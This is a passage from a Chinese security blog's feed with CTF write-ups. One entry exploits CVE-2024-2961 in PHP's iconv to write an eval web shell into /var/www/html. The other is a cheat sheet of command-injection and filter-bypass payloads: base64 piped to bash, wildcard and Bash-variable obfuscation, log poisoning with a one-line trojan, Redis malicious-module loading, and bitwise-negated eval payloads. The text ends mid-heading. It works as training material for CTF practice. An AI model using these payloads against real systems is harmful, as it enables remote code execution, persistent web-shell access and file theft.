    <link href="http://1768161086.github,io/2025/05/07/php-filter-iconv/"/>
    <id>http://1768161086.github,io/2025/05/07/php-filter-iconv/</id>
    <published>2025-05-07T05:37:19.000Z</published>
    <updated>2025-05-07T05:45:12.160Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NSSCTF-Round-30-小桃的PHP挑战"><a href="#NSSCTF-Round-30-小桃的PHP挑战" class="headerlink" title="NSSCTF Round#30 小桃的PHP挑战"></a>NSSCTF Round#30 小桃的PHP挑战</h2><p>第一关payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?one=1&amp;str=9</span><br></pre></td></tr></table></figure><p>第二关payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?two=1&amp;comment=/或者//</span><br></pre></td></tr></table></figure><p>第三关sha1的强碰撞</p><h3 id="CVE-2024-2961漏洞"><a href="#CVE-2024-2961漏洞" class="headerlink" title="CVE-2024-2961漏洞"></a>CVE-2024-2961漏洞</h3><p>1.读取&#x2F;proc&#x2F;self&#x2F;maps文件</p><p><img src="https://csd0617.github.io/picture/image-20250406154256537.png" alt="image-20250406154256537"></p><p>2.将其保存为maps</p><p>3.找到libc文件的位置</p><p><img src="https://csd0617.github.io/picture/image-20250406154512635.png" alt="image-20250406154512635"></p><p>4.读取libc文件</p><p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so</p><p><img src="https://csd0617.github.io/picture/image-20250406154651249.png" alt="image-20250406154651249"></p><p>5.将得到的内容base64解码，保存为libc.so</p><p><img src="https://csd0617.github.io/picture/image-20250406154922140.png" alt="image-20250406154922140"></p><p>6.使用脚本生成payload</p><p>脚本网址：<a href="https://github.com/kezibei/php-filter-iconv">GitHub - kezibei&#x2F;php-filter-iconv</a></p><p>7.将<code>maps</code>和<code>libc.so</code>放入该py脚本的同目录文件夹下</p><p>8.修改python脚本的cmd命令和libc文件名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;echo &#x27;&lt;?php @eval($_POST[\&quot;cmd\&quot;]); ?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span><br><span class="line">maps_path=&#x27;./maps&#x27;</span><br><span class="line">libc_path=&#x27;./libc.so&#x27;</span><br></pre></td></tr></table></figure><p>运行脚本生成payload</p><p><img src="https://csd0617.github.io/picture/image-20250406155327546.png" alt="image-20250406155327546"></p><p>9.yijian链接即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;NSSCTF-Round-30-小桃的PHP挑战&quot;&gt;&lt;a href=&quot;#NSSCTF-Round-30-小桃的PHP挑战&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF Round#30 小桃的PHP挑战&quot;&gt;&lt;/a&gt;NSSCTF Round#3</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>命令执行相关知识点解释</title>
    <link href="http://1768161086.github,io/2025/04/24/new/"/>
    <id>http://1768161086.github,io/2025/04/24/new/</id>
    <published>2025-04-24T11:33:36.997Z</published>
    <updated>2025-05-20T05:29:31.632Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ctf中命令执行相关知识点总结</p></blockquote><span id="more"></span><h1 id="1-过滤空格"><a href="#1-过滤空格" class="headerlink" title="1.过滤空格"></a>1.过滤空格</h1><p>可以用%09、%0a、${IFS}、$IFS$9 、%20、重定向符&lt;&gt;</p><h1 id="2-过滤关键字-cat、flag等"><a href="#2-过滤关键字-cat、flag等" class="headerlink" title="2.过滤关键字(cat、flag等)"></a>2.过滤关键字(cat、flag等)</h1><p>(1)过滤的字符串中加入单引号、双引号或反斜杠（ca’’t、ca””t、ca\t）&#x2F;nl</p><p>(2)$(print”\x6c\x73”)&#x3D;&#x3D;ls;利用printf+16进制输出ls,用括号外输出ls,等用于反斜杠<code>printf&quot;\x6c\x73&quot;</code>;</p><p>(3)echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash利用base64绕过；</p><p>(4)利用通配符：*&#x2F;?</p><p>(5)利用为协议：c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain或c&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>(6)为协议+base64绕过：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><h2 id="相关命令："><a href="#相关命令：" class="headerlink" title="相关命令："></a>相关命令：</h2><p>1.?c&#x3D;system(“tac%20fla*”);<br>2.?c&#x3D;echo%20<code>tac%20fla*</code>;<br>3.<code>?c=eval($_GET[1]);&amp;1=phpinfo();</code><br>4.?c&#x3D;system(“cp%20fl<em>g.php%20a.txt%20”);<br>5.<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php </code><br>6.<code>?c=include&quot;$_GET[a]&quot;?&gt;&amp;a=/var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</code><br>7.?c&#x3D;include$_GET[v]?&gt;&amp;v&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<code>&lt;?php system(&quot;tac flag.php&quot;)?&gt;</code><br>8.?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;<br>9.?c&#x3D;eval(array_pop(next(get_defined_vars())));需要POST传入参数为1&#x3D;system(‘tac fl</em>‘);<br>10.?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));<br>11.?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));<br>12.?c&#x3D;eval(next(reset(get_defined_vars())));&amp;1&#x3D;;system(“tac%20flag.php”);<br>13.system(“find &#x2F; -name flag”)：查找所有文件名匹配flag的文件</p><h1 id="3-过滤-c-a-t"><a href="#3-过滤-c-a-t" class="headerlink" title="3.过滤*c *a *t"></a>3.过滤*<em>c</em> *<em>a</em> *t</h1><p>利用<code>c=grep$&#123;IFS&#125;show$&#123;IFS&#125;fl?g.php或者c=mv$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt</code></p><p>grep命令是文本搜索命令并用show返回</p><p>mv命令的意图是将文件 <code>fl?g.php</code> 重命名为 <code>a.txt</code>。</p><h1 id="4-过滤字母-a-z"><a href="#4-过滤字母-a-z" class="headerlink" title="4.过滤字母[a-z]"></a>4.过滤字母[a-z]</h1><p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???也就是?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p><h1 id="5-过滤字母数字空格"><a href="#5-过滤字母数字空格" class="headerlink" title="5.过滤字母数字空格"></a>5.过滤字母数字空格</h1><p>写一个上传文件的脚本后抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://xxx.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>传入?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[] 等效 &#x2F;tmp&#x2F;phpxxxxxx</p><p>文件内容为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cat flag.php</span><br><span class="line">或者：cat /var/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="eg-NSSRound-30-Duo-你是谁的菜鸟，又是谁的佬大"><a href="#eg-NSSRound-30-Duo-你是谁的菜鸟，又是谁的佬大" class="headerlink" title="eg:[NSSRound#30 Duo]你是谁的菜鸟，又是谁的佬大"></a>eg:[NSSRound#30 Duo]你是谁的菜鸟，又是谁的佬大</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--$NSS = $_GET[&#x27;NSS&#x27;]; </span><br><span class="line">if (!preg_match(&#x27;/([A-Z]|;| |\$|~|\#|\(|\^)/i&#x27;, $NSS)) &#123;</span><br><span class="line">    exec($NSS);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo $Narration;  --&gt;</span><br></pre></td></tr></table></figure><p>传入?NSS&#x3D;.%09&#x2F;???&#x2F;???[@-[]</p><p>文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cat /flag &gt; 1</span><br></pre></td></tr></table></figure><h3 id="web57-取反"><a href="#web57-取反" class="headerlink" title="web57($(())取反):"></a>web57($(())取反):</h3><p>?c&#x3D;(())取反):?c&#x3D;$((<del>$(((((((($((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))(())))(())))(())))$((<del>$(())))(())))(())))(())))$((</del>$(())))))))</p><h1 id="6-过滤system"><a href="#6-过滤system" class="headerlink" title="6.过滤system"></a>6.过滤system</h1><p>show_source(‘’);或者highlight_file(‘flag.php’);或readgzfile(“&#x2F;flag.txt”);或include或require或c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt</p><h1 id="7-查看当前目录"><a href="#7-查看当前目录" class="headerlink" title="7.查看当前目录"></a>7.查看当前目录</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">查看当前目录整体地址：</span><br><span class="line">c=print_r(scandir(&#x27;./&#x27;));</span><br><span class="line">c=var_dump(scandir(&#x27;./&#x27;));</span><br><span class="line">c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));</span><br><span class="line">c=print_r(scandir(current(localeconv())));</span><br><span class="line">c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;</span><br><span class="line"></span><br><span class="line">查看根目录：</span><br><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br><span class="line">c=var_export(scandir(&#x27;/&#x27;));</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br><span class="line"></span><br><span class="line">通过单一函数读取文件：</span><br><span class="line">c=system(&#x27;strings /f*&#x27;)</span><br><span class="line">c=uniq$&#123;IFS&#125;/f???</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=echo file_get_contents(&quot;flag.php&quot;);    // 这个要看源代码</span><br><span class="line">c=readfile(&quot;flag.php&quot;);                // 这个要看源代码</span><br><span class="line">c=var_dump(file(&#x27;flag.php&#x27;));</span><br><span class="line">c=print_r(file(&#x27;flag.php&#x27;));           // file函数表示把整个文件读入一个数组中</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">一些好用的payload</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;  //源代码</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;  //源代码</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>c&#x3D;print_r(scandir或glob(“&#x2F;“));或var_dump(scandir(“&#x2F;“));或var_export(scandir(“&#x2F;“));或</p><p><code>$a = new DirectoryIterator(&quot;glob:///*&quot;); // 创建一个DirectoryIterator对象，遍历根目录 foreach ($a as $f) &#123; // 遍历每个条目;echo($f-&gt;__toString() . &#39; &#39;); // 输出条目的名称，并添加一个空格&#125;;exit(0); // 终止脚本执行</code></p><h1 id="8-字母-数字别替成？"><a href="#8-字母-数字别替成？" class="headerlink" title="8.字母&#x2F;数字别替成？"></a>8.字母&#x2F;数字别替成？</h1><p>1.命令后+ob_flush();或ob_end_flush();或exit();或die();</p><p>eg:c&#x3D;include(“&#x2F;flag.txt”);exit();</p><p> 2.scandir() 函数来扫描根目录，但由于 open_basedir 限制，这个操作会被禁止</p><p>使用 glob:&#x2F;&#x2F; 伪协议绕过 open_basedir，读取根目录下的文件，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); // 创建一个DirectoryIterator对象，遍历根目录</span><br><span class="line">foreach($a as $f) // 遍历每个条目</span><br><span class="line">&#123;</span><br><span class="line">   echo($f-&gt;__toString().&#x27; &#x27;);   // 输出条目的名称，并添加一个空格</span><br><span class="line">&#125;</span><br><span class="line">exit(0);  // 终止脚本执行</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>3.echo 输出指定数组索引的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=echo(scandir(&quot;/&quot;)[6]);exit();</span><br></pre></td></tr></table></figure><h1 id="9-e模式下的漏洞"><a href="#9-e模式下的漏洞" class="headerlink" title="9.e模式下的漏洞"></a>9.e模式下的漏洞</h1><p>e模式下的preg_replace可以让第二个参数‘替换字符串’当作代码执行，但是这里第二个参数是不可变的。<br>但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从1开始排序。<br>而strtolower(“\1”)正好表达的就是匹配区的第一个（\1&#x3D;\1），从而我们如果匹配可以，则可以将函数实现。 比如我们传入 ?.*&#x3D;{${phpinfo()}}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,$str);    // 原句</span><br><span class="line">preg_replace(&#x27;/(&#x27; .* &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,&#123;$&#123;phpinfo()&#125;&#125;);// 输入后</span><br></pre></td></tr></table></figure><p>又因为$_GET传入首字母是非法字符时候会把 .（点号）改成下划线，因此得将.换成\s</p><p>正则表达式\S：匹配非空字符</p><h2 id="例：XYCTF2024-warm-up"><a href="#例：XYCTF2024-warm-up" class="headerlink" title="例：XYCTF2024 warm up"></a>例：XYCTF2024 warm up</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;, $_POST[&#x27;a&#x27;]) &amp;&amp; intval($_POST[&#x27;a&#x27;])) &#123;</span><br><span class="line">    echo &quot;操作你O.o&quot;;</span><br><span class="line">    echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]);  // 我可不会像别人一样设置10来个level</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;有点汗流浃背&quot;);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=/1/ei&amp;b=system(&#x27;tac /f*&#x27;)&amp;c=1</span><br><span class="line">a[]=1</span><br></pre></td></tr></table></figure><p>preg_replace命令执行</p><h1 id="补充：-被过滤："><a href="#补充：-被过滤：" class="headerlink" title="补充：;被过滤："></a>补充：;被过滤：</h1><p>使用” || “ “ &amp; “ “ &amp;&amp; “ 分隔 &#x2F;dev&#x2F;null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 &#x2F;dev&#x2F;null 即不回显 ; &#x2F;&#x2F;分号 | &#x2F;&#x2F;只执行后面那条命令 || &#x2F;&#x2F;只执行前面那条命令 &amp; &#x2F;&#x2F;两条命令都会执行 &amp;&amp; &#x2F;&#x2F;两条命令都会执行</p><p>Linux 内置变量与 Bash 切片的命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$PWD和$&#123;PWD&#125;    表示当前所在的目录    /var/www/html</span><br><span class="line">$&#123;#PWD&#125;         13        前面加个#表示当前目录字符串长度</span><br><span class="line">$&#123;PWD:3&#125;        r/www/html    代表从第几位开始截取到后面的所有字符（从零开始）</span><br><span class="line">$&#123;PWD:~3&#125;        html    代表从最后面开始向前截取几位（从零开始）</span><br><span class="line">$&#123;PWD:3:1&#125;         r</span><br><span class="line">$&#123;PWD:~3:1&#125;     h</span><br><span class="line">$&#123;PWD:~A&#125;        l    这里的A其实就是表示1</span><br><span class="line">$&#123;SHLVL:~A&#125;     1    代表数字1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br><span class="line"># nl flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br><span class="line"></span><br><span class="line">就是/???/??t ????.???</span><br><span class="line"></span><br><span class="line">就是/bin/cat flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125;$&#123;IFS&#125;????.???</span><br><span class="line">/bin/base64 flag.php            这里其实$&#123;IFS&#125;可以不用直接用空格，因为没禁</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">过滤$&#123;#SHLVL&#125;可以用$&#123;##&#125;、$&#123;#?&#125;</span><br><span class="line">$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;??$&#123;PWD:$&#123;##&#125;:$&#123;##&#125;&#125; ????.???</span><br><span class="line"></span><br><span class="line">就是/???/??v ????.???</span><br><span class="line"></span><br><span class="line">就是/bin/rev flag.php</span><br><span class="line"></span><br><span class="line">$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="line"></span><br><span class="line">就是/???/?????4 ????.???</span><br><span class="line"></span><br><span class="line">就是/bin/base64 flag.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-闭合可以用"><a href="#1-闭合可以用" class="headerlink" title="1.?&gt;闭合可以用"></a>1.?&gt;闭合可以用</h2><p><code> &lt;script language=&#39;php&#39;&gt;system(&#39;ls /&#39;);&lt;/script&gt;绕过</code></p><p><code>eval(&quot;?&gt;&quot;. $word);</code></p><h2 id="2-redis加载恶意so文件"><a href="#2-redis加载恶意so文件" class="headerlink" title="2.redis加载恶意so文件"></a>2.redis加载恶意so文件</h2><p>加载命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD &quot;/var/www/html&quot;</span><br><span class="line">system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h2 id="3-if-preg-match-A-Za-z0-9-code"><a href="#3-if-preg-match-A-Za-z0-9-code" class="headerlink" title="3.if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){"></a>3.<code>if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$a=&#x27;assert&#x27;;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$c=&#x27;(eval($_POST[test]))&#x27;;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line">echo $d;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>使用php脚本获取url编码取反</p><p>上传payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure><p>一句话木马链接后用绕过disable_function插件获取flag：&#x2F;readflag</p><h2 id="10-Basectf-1z-php-echo-new-a-b-c"><a href="#10-Basectf-1z-php-echo-new-a-b-c" class="headerlink" title="10.Basectf 1z_php  echo (new $a($b))-&gt;$c();"></a>10.Basectf 1z_php  <code>echo (new $a($b))-&gt;$c();</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line"># 我记得她...好像叫flag.php吧？</span><br><span class="line">$emp=$_GET[&#x27;e_m.p&#x27;];</span><br><span class="line">$try=$_POST[&#x27;try&#x27;];</span><br><span class="line">if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)</span><br><span class="line">&#123;</span><br><span class="line">    for ($i=0;$i&lt;strlen($emp);$i++)&#123;</span><br><span class="line">        if (ctype_alpha($emp[$i]))&#123;</span><br><span class="line">            die(&quot;你不是hacker？那请去外场等候！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;只有真正的hacker才能拿到flag！&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    if (preg_match(&#x27;/.+?HACKER/is&#x27;,$try))&#123;</span><br><span class="line">        die(&quot;你是hacker还敢自报家门呢？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!stripos($try,&#x27;HACKER&#x27;) === TRUE)&#123;</span><br><span class="line">        die(&quot;你连自己是hacker都不承认，还想要flag呢？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a=$_GET[&#x27;a&#x27;];</span><br><span class="line">    $b=$_GET[&#x27;b&#x27;];</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(stripos($b,&#x27;php&#x27;)!==0)&#123;</span><br><span class="line">        die(&quot;收手吧hacker，你得不到flag的！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo (new $a($b))-&gt;$c();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;114514到底是啥意思嘞？。？&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层：参数构造和上面某题一样，传参带上小数即可绕过</p><p>第二层：回溯次数绕过，超过preg_match所能匹配的极限</p><p>第三层：原生类利用+php伪协议绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?e[m.p=114514.2&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=fgets</span><br></pre></td></tr></table></figure><p>2.post利用回溯次数绕过即可，代码生成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try = &#x27;a&#x27;*100000000 + &#x27;HACKER&#x27;</span><br><span class="line">print(try)</span><br></pre></td></tr></table></figure><p>3.或者直接构造脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">res = requests.post(&quot;http://101.37.149.223:32943/index.php?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString&quot;,data = &#123;&quot;try&quot;:&quot;-&quot;*1000001+&quot;HACKER&quot;&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h2 id="11-Basectf-玩原神玩的"><a href="#11-Basectf-玩原神玩的" class="headerlink" title="11.Basectf  玩原神玩的"></a>11.Basectf  